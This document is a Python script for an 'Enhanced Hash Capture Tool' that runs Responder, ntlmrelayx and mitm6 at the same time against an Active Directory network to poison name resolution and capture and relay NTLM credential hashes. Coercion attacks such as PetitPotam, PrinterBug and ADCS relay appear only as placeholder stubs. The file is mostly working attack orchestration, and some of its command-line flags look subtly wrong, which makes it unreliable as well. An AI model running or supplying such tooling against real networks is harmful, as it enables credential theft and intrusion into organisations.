import os
import sys
import time
import signal
import logging
import argparse
import netifaces
import ipaddress
import subprocess
import shutil
import socket
from pathlib import Path
from subprocess import Popen, PIPE, STDOUT
from threading import Thread, Event
import json
import re
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('hash_capture.log')
    ]
)

class HashCapture:
    def __init__(self, interface, domain=None, verbose=True):
        self.interface = interface
        self.domain = domain
        self.verbose = verbose
        self.stop_event = Event()
        self.processes = {}
        self.attack_threads = []
        self.local_ip = self.get_local_ip()

        # Get the global logger instance
        self.logger = logging.getLogger(__name__)
        
        # Set up attack loggers
        self.attack_loggers = {
            "ntlmrelay": logging.getLogger("ntlmrelay"),
            "responder": logging.getLogger("responder"),
            "mitm6": logging.getLogger("mitm6"),
            "petitpotam": logging.getLogger("petitpotam"),
            "printerbug": logging.getLogger("printerbug"),
            "adcs_relay": logging.getLogger("adcs_relay"),
            "webdav_relay": logging.getLogger("webdav_relay"),
            "sccm_relay": logging.getLogger("sccm_relay")
        }

        # Configure attack loggers
        for name, logger in self.attack_loggers.items():
            logger.setLevel(logging.DEBUG if verbose else logging.INFO)
            # Add file handlers for each attack logger
            file_handler = logging.FileHandler(f'{name}_attack.log')
            file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            logger.addHandler(file_handler)
        
        # Configure signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def check_dependencies(self):
        """Check if all required tools and modules are installed and accessible"""
        missing_tools = []
        missing_modules = []
        
        installation_guide = {
            "responder": "apt install responder",
            "ntlmrelayx.py": "pip3 install impacket",
            "mitm6": "pip3 install mitm6",
            "netexec": "pip3 install netexec",
            "nslookup": "apt install dnsutils",
            "petitpotam.py": "mkdir -p /opt/tools && cd /opt/tools && git clone https://github.com/topotam/PetitPotam.git && ln -s /opt/tools/PetitPotam/PetitPotam.py /usr/local/bin/petitpotam.py && chmod +x /usr/local/bin/petitpotam.py",
            "printerbug.py": "mkdir -p /opt/tools && cd /opt/tools && git clone https://github.com/dirkjanm/krbrelayx.git && ln -s /opt/tools/krbrelayx/printerbug.py /usr/local/bin/printerbug.py && chmod +x /usr/local/bin/printerbug.py",
            "dfscoerce.py": "mkdir -p /opt/tools && cd /opt/tools && git clone https://github.com/Wh04m1001/DFSCoerce.git && ln -s /opt/tools/DFSCoerce/dfscoerce.py /usr/local/bin/dfscoerce.py && chmod +x /usr/local/bin/dfscoerce.py"
        }

        required_modules = [
            'netifaces',
            'ipaddress',
            'scapy',
            'twisted',
            'impacket',
            'ldap3',
            'cryptography',
            'dsinternals'
        ]

        # Check Python modules
        self.logger.info("Checking required Python modules...")
        for module in required_modules:
            try:
                __import__(module)
                self.logger.debug(f"Module {module} is installed")
            except ImportError:
                missing_modules.append(module)
                self.logger.error(f"Module {module} is missing")

        # Check command line tools
        self.logger.info("Checking required command line tools...")
        for tool in installation_guide.keys():
            if not shutil.which(tool):
                missing_tools.append(tool)
                self.logger.error(f"Tool {tool} is missing")
            else:
                self.logger.debug(f"Tool {tool} is installed")

        # Check if Responder is properly configured
        try:
            responder_path = "/usr/share/responder"
            if not os.path.exists(responder_path):
                missing_tools.append("responder (configuration missing)")
                self.logger.error("Responder configuration is missing")
        except Exception as e:
            self.logger.error(f"Error checking Responder configuration: {e}")
            missing_tools.append("responder (configuration error)")

        # If anything is missing, print installation instructions
        if missing_tools or missing_modules:
            self.logger.error("Missing required dependencies:")
            
            if missing_tools:
                self.logger.error("\nMissing tools:")
                for tool in missing_tools:
                    if tool in installation_guide:
                        self.logger.error(f"  - {tool}")
                        self.logger.error("    Run:")
                        self.logger.error(f"{installation_guide[tool]}")
                    else:
                        self.logger.error(f"  - {tool}")

            if missing_modules:
                self.logger.error("\nMissing Python modules:")
                for module in missing_modules:
                    self.logger.error(f"  - {module}")

            self.logger.error("\nQuick install commands:")
            
            if missing_modules:
                modules_cmd = " ".join(missing_modules)
                self.logger.error("\n# Install Python modules:")
                self.logger.error(f"pip3 install {modules_cmd}")
            
            if missing_tools:
                self.logger.error("\n# Install tools:")
                for tool in missing_tools:
                    if tool in installation_guide:
                        self.logger.error(f"{installation_guide[tool]}")

            return False

        # Check if running as root
        if os.geteuid() != 0:
            self.logger.error("Script must be run as root")
            return False

        # Check network interface
        try:
            if self.interface not in netifaces.interfaces():
                self.logger.error(f"Interface {self.interface} does not exist")
                return False
            self.logger.debug(f"Interface {self.interface} exists")
        except Exception as e:
            self.logger.error(f"Error checking network interface: {e}")
            return False

        # Check IPv6 support
        try:
            with open('/proc/sys/net/ipv6/conf/all/disable_ipv6', 'r') as f:
                if f.read().strip() == '1':
                    self.logger.error("IPv6 is disabled on the system")
                    return False
            self.logger.debug("IPv6 is enabled")
        except Exception as e:
            self.logger.error(f"Error checking IPv6 status: {e}")
            return False

        self.logger.info("All dependencies, tools, and configurations verified!")
        return True

    def check_active_directory_config(self):
        """Check Active Directory related configurations"""
        if self.domain:
            try:
                # Check LDAP connectivity
                import ldap3
                server = ldap3.Server(self.get_dc_ip(), get_info=ldap3.ALL)
                conn = ldap3.Connection(server)
                if not conn.bind():
                    self.logger.warning("LDAP connection failed - some attacks might not work")

                # Check DNS records
                adcs_records = subprocess.check_output(
                    ['nslookup', f'certsrv.{self.domain}'],
                    stderr=subprocess.PIPE
                )
                if b'can\'t find' in adcs_records.lower():
                    self.logger.warning("ADCS DNS record not found - ADCS attacks might not work")

            except Exception as e:
                self.logger.warning(f"Active Directory configuration check failed: {e}")

    def get_local_ip(self):
        """Get IP address for specified interface"""
        try:
            return netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']
        except Exception as e:
            self.logger.error(f"Failed to get IP for interface {self.interface}: {e}")
            return None

    def get_dc_ip(self):
        """Get domain controller IP address"""
        try:
            if self.domain:
                cmd = f"nslookup -type=SRV _ldap._tcp.dc._msdcs.{self.domain}"
                output = subprocess.check_output(cmd.split(), universal_newlines=True)
                dc_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', output)
                if dc_ips:
                    return dc_ips[0]
        except Exception as e:
            self.logger.error(f"Failed to get DC IP: {e}")
        return None

    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        self.logger.info("Shutting down...")
        self.stop_event.set()
        self.cleanup()

    def run_attack_thread(self, attack_func):
        """Run an attack in a separate thread"""
        try:
            while not self.stop_event.is_set():
                if not attack_func():
                    time.sleep(30)  # Wait before retrying
                time.sleep(1)
        except Exception as e:
            self.logger.error(f"Error in attack thread {attack_func.__name__}: {e}")

    def cleanup(self):
        """Clean up running processes"""
        self.logger.info("Cleaning up processes")
        for name, process in self.processes.items():
            try:
                self.logger.info(f"Terminating {name}")
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self.logger.warning(f"{name} did not terminate gracefully, forcing kill")
                    process.kill()
                    process.wait()
            except Exception as e:
                self.logger.error(f"Error cleaning up {name}: {e}")

    def create_targets_file(self):
        """Create the targets file for ntlmrelayx"""
        try:
            with open("targets.txt", "w") as f:
                f.write(f"{self.local_ip}\n")
                if self.domain:
                    dc_ip = self.get_dc_ip()
                    if dc_ip:
                        f.write(f"{dc_ip}\n")
            return True
        except Exception as e:
            self.logger.error(f"Failed to create targets file: {e}")
            return False

    def start_ntlmrelay(self):
        """Start NTLM relay attack"""
        try:
            # Define the command and arguments for ntlmrelayx.py
            cmd = [
                "ntlmrelayx.py",
                "-tf", "targets.txt",
                "-smb2support",
                "-socks"
            ]
            
            # Add domain-specific arguments if a domain is specified
            if self.domain:
                cmd.extend([
                    "-domain", self.domain,
                    "-wh", self.local_ip
                ])
            
            # Start the ntlmrelayx.py process
            process = Popen(cmd, stdout=PIPE, stderr=STDOUT)
            self.processes["ntlmrelay"] = process
            
            # Log output and handle errors
            for line in iter(process.stdout.readline, b''):
                line = line.decode('utf-8').strip()
                if "Obtained valid SMB connection" in line:
                    self.attack_loggers["ntlmrelay"].info(line)
                elif "Error" in line or "Exception" in line:
                    self.attack_loggers["ntlmrelay"].error(line)
                else:
                    self.attack_loggers["ntlmrelay"].debug(line)
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_ntlmrelay: {e}")
            return False

    def start_responder(self):
        """Start Responder attack"""
        try:
            # Define the command and arguments for Responder
            cmd = [
                "responder",
                "-I", self.interface,
                "-wrf"
            ]

            # Add domain-specific arguments if a domain is specified
            if self.domain:
                cmd.extend([
                    "-v",
                    "-r", f"ldaps://{self.domain}"
                ])

            # Start the Responder process
            process = Popen(cmd, stdout=PIPE, stderr=STDOUT)
            self.processes["responder"] = process

            # Log output and handle errors
            for line in iter(process.stdout.readline, b''):
                line = line.decode('utf-8').strip()
                if "HTTPSS" in line or "RPCSS" in line:
                    self.attack_loggers["responder"].info(line)
                elif "Error" in line or "Exception" in line:
                    self.attack_loggers["responder"].error(line)
                else:
                    self.attack_loggers["responder"].debug(line)

            return True
        except Exception as e:
            self.logger.error(f"Error in start_responder: {e}")
            return False

    # Placeholder methods for other attacks (you'll need to implement these)
    def start_mitm6(self):
        """Start mitm6 attack"""
        try:
            cmd = ["mitm6"]
            
            process = Popen(cmd, stdout=PIPE, stderr=STDOUT)
            self.processes["mitm6"] = process
            
            # Placeholder logging
            for line in iter(process.stdout.readline, b''):
                line = line.decode('utf-8').strip()
                self.attack_loggers["mitm6"].debug(line)
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_mitm6: {e}")
            return False

    def start_petitpotam(self):
        """Start PetitPotam attack"""
        # Placeholder implementation
        self.logger.info("PetitPotam attack not fully implemented")
        return False

    def start_printerbug(self):
        """Start PrinterBug attack"""
        # Placeholder implementation
        self.logger.info("PrinterBug attack not fully implemented")
        return False

    def start_adcs_relay(self):
        """Start ADCS Relay attack"""
        # Placeholder implementation
        self.logger.info("ADCS Relay attack not fully implemented")
        return False

    def start_webdav_relay(self):
        """Start WebDAV Relay attack"""
        # Placeholder implementation
        self.logger.info("WebDAV Relay attack not fully implemented")
        return False

    def start_sccm_relay(self):
        """Start SCCM Relay attack"""
        # Placeholder implementation
        self.logger.info("SCCM Relay attack not fully implemented")
        return False

    def run(self):
        """Main execution flow running all attacks simultaneously"""
        self.logger.info("Starting Hash Capture Operation")
        
        # Run all checks first
        self.logger.info("Running system and dependency checks...")
        if not self.check_dependencies():
            return False
        
        if self.domain:
            self.logger.info("Checking Active Directory configuration...")
            self.check_active_directory_config()
        
            # Create Targets File
            if not self.create_targets_file():
                self.logger.error("Failed to create targets file")
                return False
        
        try:
            # List of all attack functions
            attacks = [
                self.start_ntlmrelay,
                self.start_responder,
                self.start_mitm6,
                self.start_petitpotam,
                self.start_printerbug,
                self.start_adcs_relay,
                self.start_webdav_relay,
                self.start_sccm_relay
            ]

            # Start each attack in its own thread
            for attack in attacks:
                thread = Thread(target=self.run_attack_thread, args=(attack,))
                thread.daemon = True
                thread.start()
                self.attack_threads.append(thread)

            self.logger.info("All attacks started successfully")

            # Monitor attack threads
            while not self.stop_event.is_set():
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.logger.info("Operation interrupted by user")
        finally:
            self.cleanup()
        
        return True

def main():
    parser = argparse.ArgumentParser(description="Enhanced Hash Capture Tool")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    parser.add_argument("-d", "--domain", help="Domain name for attacks")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
    args = parser.parse_args()

    if os.geteuid() != 0:
        logging.error("This script must be run as root")
        sys.exit(1)

    capture = HashCapture(args.interface, args.domain, args.verbose)
    if not capture.run():
        sys.exit(1)

if __name__ == "__main__":
    main()
